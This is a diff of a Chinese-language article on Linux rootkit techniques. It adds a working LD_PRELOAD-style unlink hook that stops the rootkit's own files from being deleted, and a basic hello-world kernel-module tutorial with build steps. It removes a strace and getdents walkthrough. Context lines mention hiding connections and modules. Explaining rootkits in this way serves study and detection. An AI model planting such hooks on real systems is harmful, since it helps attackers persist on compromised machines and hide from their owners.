@@ -175,6 +175,25 @@ struct dirent* readdir(DIR *dirp)
 	HOOK netstat命令的相关函数调用， 一般会HOOK readdir/getdents来隐藏特定端口的连接
 
 
+防止被删除
+	HOOK rm 命令的相关函数调用，一般会HOOK unlink函数，来避免自己被删除
+
+```bash
+
+
+int unlink (const char *pathname)
+{
+   old_unlink = dlsym(RTLD_NEXT, "unlink");
+  if ((strstr (pathname, MAGIC_STRING)) || (strstr (pathname, CONFIG_FILE)) || (strstr (pathname, LIB_FILE))) {
+    errno = ENOENT;
+    return -1;
+  }
+
+  return old_unlink (pathname);
+}
+
+
+```
 
 
 
@@ -182,7 +201,60 @@ struct dirent* readdir(DIR *dirp)
 #### 内核态可装载内核模块（LKM）
 
 
-内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK。那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。
+内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK。那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。首先，了解一下LKM 怎么编写。
+
+##### LKM 怎么编写
+
+```bash
+
+CentOS
+#  yum install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r)  gcc gcc-c++ make
+
+Debian + Ubuntu
+#  apt install -y  gcc g++ make  linux-headers-$(uname -r)
+
+```
+确保系统已经安装了内核头文件和编译工具。
+
+下面是一个非常基础的内核模块示例代码（hello.c）：
+
+```bash
+
+#include <linux/init.h>   // 包含宏定义 module_init 和 module_exit
+#include <linux/module.h> // 包含核心模块函数和变量
+
+// 模块加载时调用的函数
+static int __init hello_start(void) {
+    printk(KERN_INFO "Hello world!\n");
+    return 0; // 返回0表示成功加载
+}
+
+// 模块卸载时调用的函数
+static void __exit hello_end(void) {
+    printk(KERN_INFO "Goodbye world!\n");
+}
+
+module_init(hello_start); // 注册模块初始化函数
+module_exit(hello_end);   // 注册模块退出函数
+
+MODULE_LICENSE("GPL"); // 声明模块许可，避免警告
+MODULE_AUTHOR("Your Name"); // 可选：作者信息
+MODULE_DESCRIPTION("A simple Hello world LKM"); // 可选：模块描述
+```
+
+为了编译这个模块，需要一个Makefile：
+
+```bash
+obj-m += hello.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+
+在包含源代码和Makefile的目录下运行make命令进行编译。如果一切正常，应该能看到生成的.ko文件。使用insmod hello.ko命令加载模块，并使用dmesg | tail查看日志输出确认模块是否正确加载。使用rmmod hello卸载模块，并再次检查日志以确认卸载消息。这只是一个入门级的例子。实际应用中，内核模块可能会更加复杂，包括错误处理、参数传递等。务必小心操作，因为错误的内核模块有可能导致系统不稳定或崩溃。
 
 
 ##### 修改哪些数据结构
@@ -217,38 +289,12 @@ void module_hide(void)
 	module_hidden = !module_hidden;
 }
  
- 
- ```
 
+```
 
 
 
 ##### 怎么HOOK与HOOK哪些函数
-
-当某个程序需要借助网络、文件系统或其他系统特定活动进行工作时，它就必须经过内核。也就是说，在此时它将使用系统调用。我们可以使用一个名为Strace的工具。Strace将会列出程序所使用的系统调用。
-
-```bash
-# yum -y install strace
-#cd /bin && strace ls 
-
-ioctl(1, TIOCGWINSZ, 0x7ffedb86fcd0)    = -1 ENOTTY (Inappropriate ioctl for device)
-openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
-getdents(3, /* 1036 entries */, 32768)  = 32744
-brk(NULL)                               = 0xc6f000
-brk(0xc99000)                           = 0xc99000
-brk(NULL)                               = 0xc99000
-brk(NULL)                               = 0xc99000
-brk(0xc90000)                           = 0xc90000
-brk(NULL)                               = 0xc90000
-mmap(NULL, 311296, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f60ea4a8000
-getdents(3, /* 32 entries */, 32768)    = 1096
-getdents(3, /* 0 entries */, 32768)     = 0
-
-```
-我们需要关注的系统调用是getdents函数。
-
-
-在Linux系统中，如果我们想在内核中运行代码，我们可以借助于可装载内核模块（LKM）。一些有用的内核符号就会被内核导出，我们便能够去使用它们，或者也可以通过kallsyms_lookup_name函数来获取。在内核中，我们需要拦截getdents调用，并对它返回的值进行更改。那么，接下来要解决的问题就是我们要如何Hook getdents。
 
 
 在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
